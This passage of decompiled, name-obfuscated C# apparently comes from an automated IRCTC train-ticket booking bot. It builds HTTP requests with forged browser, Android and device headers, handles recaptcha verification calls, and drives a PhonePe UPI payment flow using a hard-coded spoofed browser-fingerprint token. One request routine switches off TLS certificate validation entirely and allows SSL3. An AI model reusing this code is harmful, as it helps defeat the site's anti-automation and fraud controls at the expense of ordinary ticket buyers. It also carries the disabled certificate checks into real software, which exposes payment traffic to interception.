                string text2 = "";
                int num8 = ((url.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || url.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    HttpRequestCachePolicy httpRequestCachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(1.0));
                    httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    httpWebRequest.Proxy = proxy;
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if (A_8 > 0)
                    {
                        httpWebRequest.Timeout = A_8;
                    }
                    if (A_9 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = A_9;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(postdata);
                    if (A_6 && C_Container == null)
                    {
                        C_Container = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = C_Container;
                    bool flag = postdata.Length > 0;
                    if (flag)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_38)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_38 = false;
                    }
                    else if (bool_39)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_39 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    if (url.Contains(".paytm.in"))
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Set("X-Requested-With", "cris.org.in.prs.ima");
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36";
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36";
                        httpWebRequest.Headers.Set("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                        httpWebRequest.Headers.Set("accept-encoding", "gzip, deflate");
                        httpWebRequest.Headers.Set("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Set("Cache-Control", "max-age=0");
                    }
                    if (url.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_11)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Set("X-Requested-With", "XMLHttpRequest");
                    }
                    else if (url.ToLower().Contains("irctc.co.in") && !bool_3)
                    {
                        httpWebRequest.Headers.Set("X-Requested-With", "XMLHttpRequest");
                    }
                    else if (url.Contains(".action"))
                    {
                        httpWebRequest.Headers.Set("version", "4.0");
                    }
                    if (num2 != 0)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Set("faces-request", "partial/ajax");
                        if (proxy != null)
                        {
                            httpWebRequest.Headers.Set("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Set("Pragma", "no-cache");
                        }
                        bool_3 = false;
                    }
                    if (bool_5)
                    {
                        //httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_49;
                    }
                    if ((url.Contains("recaptcha/api2/userverify") ? 1 : 0) == 1)
                    {
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";
                        //httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + string_65 + " Safari/537.36";
                    }
                    if (url.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if ((url.Contains("fss.co.in") || url.Contains("fssnet.co.in")) && !bool_12)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (url.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (url.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + reff;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Set("Cookie2", "$Version=" + 1);
                    }
                    if (bool_14)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_14 = false;
                    }
                    else if (num8 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Set("X-Priority", "5");
                        httpWebRequest.Headers.Set("x-msg-priority", "9");
                    }
                    if (num4 != 0)
                    {
                        bool_13 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (num3 != 0)
                    {
                        httpWebRequest.ContentType = "application/json";
                        if (num6 != 0)
                        {
                            bool_24 = false;
                            httpWebRequest.Headers.Set("browserName", "Chrome");
                            httpWebRequest.Headers.Set("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Set("assignedClientId", "null");
                            httpWebRequest.Headers.Set("osVersion", "Windows 7");
                            httpWebRequest.Headers.Set("clientId", "Web");
                            httpWebRequest.Headers.Set("deviceId", "null");
                            httpWebRequest.Headers.Set("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Set("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Set("appVersion", "null");
                        }
                        if (url.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (num5 != 0)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_32 = false;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "||");
                        int num9 = Information.UBound(array);
                        for (int i = 0; i <= num9; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "#");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_63i = "";
                    }
                    if (!string.IsNullOrEmpty(reff))
                    {
                        httpWebRequest.Referer = reff;
                    }
                    //if (flag)
                    //{
                    //    using Stream stream = httpWebRequest.GetRequestStream();
                    //    stream.Write(bytes, 0, bytes.Length);
                    //}
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently)
                    {
                        Thread.Sleep(200);
                        url = httpWebResponse.GetResponseHeader("Location");
                        Locations = url;
                        postdata = "";
                        continue;
                    }
                    string StValue = "";
                    CookieFillter(httpWebResponse, ref StValue);
                    if (bool_4)
                    {
                        dateTime_0 = DateTime.Parse(httpWebResponse.Headers["Date"]);
                    }
                    if (bool_6)
                    {
                        string_5 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (A_7)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    A_10 = text2;
                    num7 = 1;
                    stopwatch.Stop();
                    long num10 = (Cur_wait = stopwatch.ElapsedMilliseconds);
                    Avg_wait = (Cur_wait + Privs_wait) / 2;
                    bool_23 = false;
                    clsMain.Lock("Getting Html out= " + response);
                }
                catch (WebException ex)
                {
                    num7 = 0;
                    A_12 = ex;
                    string message = ex.Message;
                    bool flag2 = ex.Response != null;
                    string text3 = "";
                    int num11 = 200;
                    num++;
                    HttpStatusCode httpStatusCode = (HttpStatusCode)num11;
                    if (flag2)
                    {
                        num11 = (int)((HttpWebResponse)ex.Response).StatusCode;
                        httpStatusCode = (HttpStatusCode)num11;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    A_11 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    method_47("WebRequestPost WebEx=", A_11);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(2000);
                            continue;
                        }
                        Thread.Sleep(1000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        ServicePointManager.UseNagleAlgorithm = true;
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.CheckCertificateRevocationList = true;
                        ServicePointManager.DefaultConnectionLimit = 1000000;
                        ServicePointManager.DefaultConnectionLimit = 2;
                        if (message.Contains("An unexpected error occurred on a send") || message.Contains("A connection that was expected to be kept alive was closed by the server") || message.Contains("An unexpected error occurred on a receive"))
                        {
                        }
                        //if (num == 3 || num == 4)
                        //{
                        //    webProxy_2 = PrivateProxy;
                        //    proxy = PrivateProxy;
                        //}
                        if (num < 5)
                        {
                            continue;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num < 5)
                        {
                            continue;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num < 5)
                        {
                            continue;
                        }
                    }
                    else if (!message.Contains("(406) Not Acceptable") && !message.Contains("(401) Unauthorized") && !message.Contains("(400) Bad Request") && !(message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) && (message.Contains("(500) Internal Server Error") || message.Contains("(502) Bad Gateway") || message.Contains("(503) Server Unavailable") || message.Contains("(504) Gateway Timeout")))
                    {
                        continue;
                    }
                }
                catch (Exception ex2)
                {
                    num7 = 0;
                    A_11 = ex2.Message;
                    method_47("WebRequestPost Ex=", A_11 + "  hitUrl" + url + "  Inp=" + postdata + " Ref=" + reff + " reHitCount=" + num);
                    if (num < 3 && A_11.Contains("String reference not set to an instance"))
                    {
                        A_11 = "";
                        num++;
                        continue;
                    }
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
                break;
            }
            return num7 != 0;
        }

        internal bool method_159_(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool flag = class3_0.LoginType == "WEB";
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_PhonePe.  DETAILS: ");
            string_86.Contains("PhonePe");
            bool result = false;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if (!((text == "HDFC_DC") | text.Contains("HDFC_CC")) && !((text == "SBI_DC") | text.Contains("SBI_CC")) && !text.Contains("AIRTEL_CC"))
                {
                }
            }
            else if (!string_88.Contains("PHONEPE"))
            {
                string text4 = text;
                switch (text4)
                {
                    default:
                        if (!(text4 == "IDBI"))
                        {
                            text4 = "CORP";
                        }
                        break;
                    case "HDFC":
                    case "SBI":
                    case "ICICI":
                    case "UNION":
                        break;
                }
            }
            try
            {
                string text6 = string_86.Substring(string_86.IndexOf("token") + 16);
                string text7 = text6.Substring(0, text6.IndexOf("\""));
                string text14s = "eyJvc2lkIjoiNDc4ZDFlZjQzNmExZjQwYmMwNDkyYjBmYjI4ZDE4OTQxMjA2MWZiMjU3OGZmZDZhMjNmMzViYWYzZWRmZTI0MyIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjVlMTA1YWY0NTIwNTU3MGE0ODJhMjM0MjAzYjZiYjAxZmVkOTY3NTMwMzA2ZjNjMGNiMjVmYWRkNWY1ZWJiNzciLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDkyLjAiLCJ4ZHBpIjoiZDU0ZjM0MTU1MTZlZTQzMGE2OTEzNzFlZTNiZjVmMzYyYmRhYzUzODU0YWI0MDZlZTVmYWMwNjBiMzJhZGZkNiJ9";
                if (!flag)
                {
                    string text5 = response.Substring(response.IndexOf("amount") + 9);
                    text5.Substring(0, text5.IndexOf("\""));
                    url = "https://mercury-t2.phonepe.com/transact";
                    postdata = "token=" + text7;
                }
                else
                {
                    postdata = class3_0.Method_SerialInp_pho(string_86, ref url, A_2: false);
                    //url = "https://mercury-t2.phonepe.com/transact";
                    //postdata = "token=" + text7;
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(1/5)", tCntrlName_, null, null);
                }
                bool_6 = true;
                if (!Http_(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                //dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                //Stopwatch44.Restart();
                //Stopwatch44.Restart();
                string text18 = text7;//string_5.Substring(string_5.IndexOf("token=") + 6);
                reff = "https://www.irctc.co.in/";
                url = "https://mercury-t2.phonepe.com/apis/v1/init/composite?t=" + method_14() + "__5";
                postdata = "{}";
                bool_13 = true;
                string_63i = "x-auth-token#" + text18 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#true";
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(2/5)", tCntrlName_, null, null);
                if (!Http_(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }
                string strText = "{\"vpa\":\"" + text2 + "\"}";
                string text19 = Class12.smethod_34(strText);
                reff = string_5;
                url = "https://mercury-t2.phonepe.com/apis/v1/vpa/validate?t=" + method_14() + "__5";
                postdata = "{\"request\":\"" + text19 + "\"}";
                bool_13 = true;
                string_63i = "x-auth-token#" + text18 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#true";
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(3/5)", tCntrlName_, null, null);
                if (!Http_(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }

                if (!response.Contains("name"))
                {
                    string_91 = "Change Bank Getways";
                    return false;
                }
                url = "https://mercury-t1.phonepe.com/apis/v1/vpa/pay?t=" + method_14();
                strText = "{\"external_vpa\":{\"details\":{\"vpa\":\"" + text2 + "\"}}}";
                text19 = Class12.smethod_34(strText);
                bool_13 = true;
                postdata = "{\"payRequest\":\"" + text19 + "\"}";
                updateTStatus_1.BeginInvoke(1, "Confirm UPI from Mobile", tCntrlName_, null, null);
                string_63i = "x-auth-token#" + text18 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#true";
                if (!Http_(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }

                postdata = "";
                DateTime dateTime = DateTime.Now.AddSeconds(UpiTimeout);
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(4/5)", tCntrlName_, null, null);
                do
                {
                    url = "https://mercury-t2.phonepe.com/apis/v1/transaction/status?t=" + method_14();
                    Thread.Sleep(2000);
                    if (DateTime.Now > dateTime)
                    {
                        break;
                    }

                    bool_13 = true;
                    string_52 = "Tls12";
                    string_63i = "x-auth-token#" + text18 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#false";
                    if (!Http_(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        string_91 = "Change Bank Getways";
                        return false;
                    }
                }
                while (!response.Contains("state\":\"SUCCESS"));
                if (!response.Contains("state\":\"SUCCESS"))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text10 = response;
                url = "https://mercury-t2.phonepe.com/apis/v1/irctc/notification?t=" + method_14();
                bool_13 = true;
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(4/5)", tCntrlName_, null, null);
                string_63i = "x-auth-token#" + text18 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#false||debugPayload#" + text10;
                if (!Http_(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.Contains("https://www.irctc.co.in/eticketing/"))
                {
                    string text11 = response.Substring(response.IndexOf("url") + 6);
                    text11 = text11.Substring(0, text11.IndexOf("\""));
                    string text12 = response.Substring(response.IndexOf("response") + 11);
                    text12 = "response=" + text12.Substring(0, text12.IndexOf("\""));
                    response = method_168(text11, text12);
                    string_91 = url;
                    string_90 = response;
                    return true;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_PhonePay", ex.Message);
                File.AppendAllText(string_42, class3_0.string_39 + "|");
                return false;
            }
        }


        private string CookieFillter(HttpWebResponse httpWebResponse, ref string StValue)
        {
            string text = "";
            try
            {
                foreach (Cookie cookie in httpWebResponse.Cookies)
                {
                    string text2 = cookie.Name + "#" + cookie.Value;
                    if (cookie.Name == StValue)
                    {
                        StValue = cookie.Value;
                    }
                    text = text + text2 + "||";
                }
                Cookieklist = text;
            }
            catch
            {
            }
            return text;
        }


        internal void method_47(string A_1, string A_2)
        {
            //object obj = object_0;
            //lock (obj)
            //{
            //    list_0.Add(DateTime.Now.ToString("dd-MMM-yyyy hh:mm:ss.fff") + " : " + string_8 + " : Exception : " + A_1 + " : " + A_2);
            //}
        }

        internal bool method_87(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            bool flag2 = bool_21;
            bool flag3 = bool_36;
            int num3 = (bool_29 ? 1 : 0);
            int num4 = (bool_38 ? 1 : 0);
            bool flag4 = bool_37;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            if (flag2 && clsMain.bool_RedirectToBank)
            {
                string_90 = "Availability Already Received";
                return false;
            }
            int num5;
            while (true)
            {
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num5 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num6 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    if (string_86.Contains("paytm.in") || string_86.Contains("onlinesbi.com"))
                    {
                        ServicePointManager.Expect100Continue = false;
                    }
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag5;
                    if (flag5 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36";
                    httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                    httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                    httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                    httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                    httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                    httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                    httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                    httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                    httpWebRequest.ContentLength = bytes.Length;
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num6 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (num3 != 0)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (num4 != 0)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num7 = Information.UBound(array);
                        for (int i = 0; i <= num7; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag5)
                    {
                        httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num6 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = httpWebResponse.GetResponseHeader("Location");
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_22)
                    {
                        dateTime_1 = DateTime.Parse(httpWebResponse.Headers["Date"]);
                    }
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num5 = 1;
                    clsMain.Lock("Getting Html out= " + response);
                    break;
                }
                catch (WebException ex)
                {
                    num5 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag6 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag6)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num5 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num5 != 0;
        }

        internal bool method_88(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
